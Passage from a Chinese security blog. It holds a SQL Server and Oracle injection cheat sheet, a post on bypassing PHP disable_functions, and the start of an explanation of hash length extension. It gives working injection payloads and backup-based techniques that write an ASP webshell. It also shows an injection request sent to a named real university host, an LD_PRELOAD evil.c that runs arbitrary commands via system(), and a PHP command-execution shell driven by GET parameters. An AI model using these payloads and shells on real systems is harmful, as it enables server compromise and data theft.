#截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">if语句：sqlserver：if(1=1) (sql语句)   else （sql语句）</span><br><span class="line"></span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"></span><br><span class="line">#查询数据表</span><br><span class="line">select * from sysobjects where type=&#x27;u&#x27;  #查询当前数据库的所有表的详细信息</span><br><span class="line">select count(name) from msdb..sysobjects where xtype=&#x27;U&#x27;  #查询指定msdb数据库中表的个数</span><br><span class="line">select name from msdb..sysobjects where xtype=&#x27;U&#x27;         #查询指定msdb数据库中表的名字</span><br><span class="line">select * from msdb..sysobjects where xtype=&#x27;U&#x27;            #查询指定msdb数据库中表的详细信息</span><br><span class="line"></span><br><span class="line">#查询列</span><br><span class="line">select name from syscolumns where id=(select max(id) from sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)           #查询当前数据库的指定users表的所有列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)   #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"></span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..user          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..user                 #查询test数据库user表的所有数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>手工注入payload: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">xray检验是否存在sql注入：</span><br><span class="line">932&#x27;and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;1899274127&#x27;)))&gt;&#x27;0</span><br><span class="line"></span><br><span class="line">boolean-based blind</span><br><span class="line">Payload: centid=932&#x27; AND 6663=6663 AND &#x27;dlfS&#x27;=&#x27;dlfS</span><br><span class="line"></span><br><span class="line">error-based</span><br><span class="line">Payload: centid=932&#x27; AND 8657 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8657=8657) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(120)+CHAR(122)+CHAR(113))) AND &#x27;YkOb&#x27;=&#x27;YkOb</span><br><span class="line">Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">stacked queries</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">time-based blind</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line">admin&#x27;and(select+1)&gt;0waitfor/**/delay&#x27;0:0:3</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br><span class="line"></span><br><span class="line">获取当前user</span><br><span class="line">932&#x27; and 1=(select user_name())--</span><br><span class="line">获取当前数据库</span><br><span class="line">932&#x27; and 1=(select db_name()) AND &#x27;WckB&#x27;=&#x27;WckB</span><br><span class="line"></span><br><span class="line">获取第一个数据库(dbid=1获取第一个)</span><br><span class="line">932&#x27; and 1=(select name from master.dbo.sysdatabases where dbid=1)--</span><br><span class="line">注表名</span><br><span class="line">932&#x27; and  1=(select top 1 name from where xtype=’u’)--</span><br><span class="line">注列名</span><br><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;表名&#x27;))--</span><br><span class="line">注数据</span><br><span class="line">932&#x27; and 1=(select top 1 表名 from 字段名)--</span><br><span class="line">查看是否有xp_cmdshell权限（）</span><br><span class="line">932&#x27; and 1=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">932&#x27; and 0=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">判断当前数据库用户权限</span><br><span class="line">and 1=(IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))        //返回正常为sa</span><br><span class="line">and 1=(IS_MEMBER(&#x27;db_owner&#x27;))               //返回正常为DB_OWNER</span><br><span class="line">and 1=(IS_srvrolemember(&#x27;public&#x27;))          //public权限,较低</span><br></pre></td></tr></table></figure>

<h2 id="SqlServer-getshell"><a href="#SqlServer-getshell" class="headerlink" title="SqlServer getshell"></a>SqlServer getshell</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/90509698">LOG备份</a></h3><p>利用条件：</p>
<ol>
<li>至少DBO权限</li>
<li>前提得知绝对路径，并且可写</li>
<li>站库不分离</li>
<li>数据库必须被备份过一次</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;</span><br><span class="line">create table dbo.test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk=&#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">backup log test to disk=&#x27;d:\shell.asp&#x27; with init;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>

<p>测试dbo权限写入成功：</p>
<p><img src="mssql_log_write_shell.jpg" alt="image"></p>
<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">差异备份</a></h3><ol>
<li>至少DBO权限</li>
<li>前提知道绝对路径，路径可写。</li>
<li>HTTP 500错误不是自定义</li>
<li>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</li>
<li>数据量不能太大</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk = &#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">create table test..test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk = &#x27;D:\phpstudy_pro\WWW\shell3.asp&#x27; with differential , format;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
<p>测试dbo权限写入成功：</p>
<p><img src="mssql_diff_write_shell.jpg" alt="image"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Sqlserver 大于2005版本默认关闭xp_cmdshell，无法执行系统cmd命令，需要安装cmd_shell组件。</p>
<p>db_owner、public权限提权：通过文件备份功能写入一句话木马</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807695.html">SQLServer数据库及注入方法</a></li>
</ul>
<h1 id="Oralce"><a href="#Oralce" class="headerlink" title="Oralce"></a>Oralce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /middle.aspx HTTP/1.1</span><br><span class="line">Host: library.ysu.edu.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 115</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://library.ysu.edu.cn/</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">number=2&#x27;/**/and/**/(select decode(length(user),5,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual)=&#x27;1&amp;passwd=admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; python sqlmap.py -r pack.txt -pnumber  -v --sql-shell</span><br><span class="line">select banner from sys.v_$version [2]:</span><br><span class="line">[*] Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br><span class="line">[*] PL/SQL Release 11.2.0.1.0 - Production</span><br></pre></td></tr></table></figure>
<h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
<li>Oracle不支持堆叠查询</li>
<li>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。</li>
<li>不同于其它数据库，oracle只会安装一个数据库，但是可以创建多个用户，将用户和表对应起来。</li>
<li>dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li>
<li>创建用户不指定表空间会把各种数据放到默认的空间里</li>
</ul>
<p>常用数据表：</p>
<ul>
<li>dba用户表：dba_users</li>
<li>dba表空间表：dba_tablespaces</li>
<li>版本号表：product_component_version</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin&gt; sqlplus</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.2.0 Production on 星期四 9月 24 11:54:09 2020</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2014, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">请输入用户名:  sys as sysdba</span><br><span class="line">输入口令:</span><br><span class="line"></span><br><span class="line">连接到:</span><br><span class="line">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">//create user xxxxx(用户名) identified by &quot;密码&quot; </span><br><span class="line">//grant dba to 用户名  --给用户赋予所有权限，connect是赋予连接数据库的权限，resource 是赋予用户只可以创建实体但是没有创建数据结构的权限。</span><br><span class="line"></span><br><span class="line">//切换用户</span><br><span class="line">SQL&gt; conn scott</span><br><span class="line">输入口令: 123456</span><br><span class="line">已连接。</span><br><span class="line"></span><br><span class="line">//查看当前用户==show user</span><br><span class="line">SQL&gt; select user from dual;  </span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SCOTT</span><br><span class="line"></span><br><span class="line">//查看数据库版本</span><br><span class="line">SQL&gt; select product, version from product_component_version where substr(product, 1, 6)=&#x27;Oracle&#x27;; </span><br><span class="line"></span><br><span class="line">PRODUCT</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">VERSION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Oracle Database 11g Express Edition</span><br><span class="line">11.2.0.2.0</span><br><span class="line"></span><br><span class="line">//使用host命令可以执行系统命令</span><br><span class="line">SQL&gt; host whoami</span><br><span class="line">desktop-3o58k0a\admin</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">SQL&gt; create table t_user(id number(10) primary key, name varchar2(20)); </span><br><span class="line"></span><br><span class="line">表已创建。</span><br><span class="line"></span><br><span class="line">//插入</span><br><span class="line">SQL&gt; insert into t_user(id, name) values(1, &#x27;123&#x27;); //必须是单引号？双引号就报错</span><br><span class="line"></span><br><span class="line">已创建 1 行。</span><br><span class="line"></span><br><span class="line">//有更新一定要commit</span><br><span class="line">SQL&gt;COMMIT;</span><br><span class="line"></span><br><span class="line">//查看所有表空间</span><br><span class="line">SQL&gt; select tablespace_name from dba_tablespaces;</span><br><span class="line"></span><br><span class="line">TABLESPACE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SYSTEM</span><br><span class="line">SYSAUX</span><br><span class="line">UNDOTBS1</span><br><span class="line">TEMP</span><br><span class="line">USERS</span><br><span class="line"></span><br><span class="line">//查看当前用户的表</span><br><span class="line">SQL&gt; select table_name from user_tables where rownum &lt; 5;</span><br><span class="line"></span><br><span class="line">TABLE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">ICOL$</span><br><span class="line">IND$</span><br><span class="line">COL$</span><br><span class="line">CLU$</span><br><span class="line"></span><br><span class="line">//延时函数dbms_pipe.receive_message：从rds（可任意命名）管道等待4秒钟</span><br><span class="line">SQL&gt; select dbms_pipe.receive_message(&#x27;rds&#x27;, 4) from dual;</span><br><span class="line"></span><br><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RDS&#x27;,4)</span><br><span class="line">----------------------------------</span><br><span class="line">                                 1</span><br><span class="line">//查询ip地址</span><br><span class="line">SQL&gt; select utl_inaddr.get_host_address from dual;</span><br><span class="line"></span><br><span class="line">GET_HOST_ADDRESS</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">fe80::35db:b13e:5850:3ca3%3</span><br></pre></td></tr></table></figure>

<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值) //作用与if类似</span><br><span class="line">substr(user, 1, 1)</span><br><span class="line">ascii(&#x27;a&#x27;)</span><br><span class="line">dbms_pipe.receive_message(任意管道名, 等待时间)</span><br></pre></td></tr></table></figure>

<h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">time-based</span><br><span class="line">2&#x27;/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(&#x27;f&#x27;,3)=&#x27;f</span><br><span class="line">2&#x27;/**/and/**/(select decode(length(user),6,dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br><span class="line">2&#x27;/**/and/**/(select decode(ascii(substr(user,1,1)), 128, dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/">Oracle注入 - 命令执行&amp;Shell反弹</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/09/04/bypass-disable-functions/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/09/04/bypass-disable-functions/" itemprop="url">绕过disable_functions实战</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-04T11:26:44+08:00">
                2020-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">Web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x01-LD-PRELOAD"><a href="#0x01-LD-PRELOAD" class="headerlink" title="0x01 LD_PRELOAD"></a>0x01 LD_PRELOAD</h2><blockquote>
<p>前提：putenv没有禁用</p>
</blockquote>
<p><code>evil.c</code>上传至目标服务器并编译为<code>evil.so</code></p>
<blockquote>
<p>gcc -shared -fPIC evil.c -o evil.so</p>
</blockquote>
<p>evil.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传test.php至目标服务器，访问时传入三个参数命令、输出文件（需存在于服务器上，没有不会创建）、so文件。执行成功后，会在输出文件中看到命令执行结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/test.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/evil.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/391">一次艰难的渗透提权过程</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li>
</ul>
<h2 id="0x02-php-fpm"><a href="#0x02-php-fpm" class="headerlink" title="0x02 php-fpm"></a>0x02 php-fpm</h2><p>使用蚁剑 bypass_disable_functions插件。</p>
<p>前提：phpinfo中的server api是FPM/FastCGI，并且需要知道FPM/FCGI Address，也就是php-cgi-xx.sock，可以去猜测。蚁剑默认的地址不一定是对的。</p>
<p><img src="1.jpg" alt="image"></p>
<p>在插件市场下载插件，然后右键选择：</p>
<p><img src="4.jpg" alt="image"></p>
<p><img src="3.jpg" alt="image"></p>
<p>选择<code>Fastcgi/PHP_FPM</code>模式，填写<code>PPM/FCGI</code> 地址，然后点击开始即可：</p>
<p><img src="2.png" alt="image"></p>
<p>之后再用蚁剑连接上传成功的<code>.antproxy.php</code>文件地址，就可以在虚拟终端执行命令了。</p>
<h2 id="更多姿势"><a href="#更多姿势" class="headerlink" title="更多姿势"></a>更多姿势</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">lemon绕过disable_functions合辑</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/10140050.html">pcntl_exec()没有被禁用</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">更多PHP7下绕过姿势</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/06/07/hash-length-extension-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/07/hash-length-extension-attack/" itemprop="url">学习Hash长度扩展攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-07T15:35:44+08:00">
                2020-06-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index">
                    <span itemprop="name">密码学</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Hash算法原理简化版"><a href="#Hash算法原理简化版" class="headerlink" title="Hash算法原理简化版"></a>Hash算法原理简化版</h3><p><img src="1.png" alt="image"></p>
<p>分组不够56字节用\x80\x00\x00…补够，然后最后八字节为长度描述符，由Hash算法补充，一共64字节。</p>
<p><img src="2.png" alt="image"></p>
<p>长度描述符计算的是文本的真实长度（单位bit，1字节=8 it），不包含填充长度。</p>
<h3 id="Hash长度扩展攻击原理"><a href="#Hash长度扩展攻击原理" class="headerlink" title="Hash长度扩展攻击原理"></a>Hash长度扩展攻击原理</h3><p>从图1中可以看出，Hash算法初始向量是固定的，第n个向量可以通过第n-1个向量与第n个分组计算得出。这个第n个向量经高低位互换后也就是这个文本的Hash值。</p>
<p>假设有两个不同的字符串str1和str2，他们的分组1相同，str2有分组2而str1没有。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1: 分组1</span><br><span class="line">str2: 分组1 分组2</span><br></pre></td></tr></table></figure>
<p>那么由于他们的分组1相同，所以向量1也相同（初始向量和分组1计算得到向量1）。</p>
<p>正常的Hahs算法为下图中的实线部分。</p>
<p><img src="3.png" alt="image"></p>
<p>解释虚线部分：</p>
<p>由str1的Hash值（经高低位互换后成为向量1）和str2的分组2计算也可以得到str2的Hash值。这个就是Hash长度扩展攻击的利用原理。</p>
<p>利用场景如下。</p>
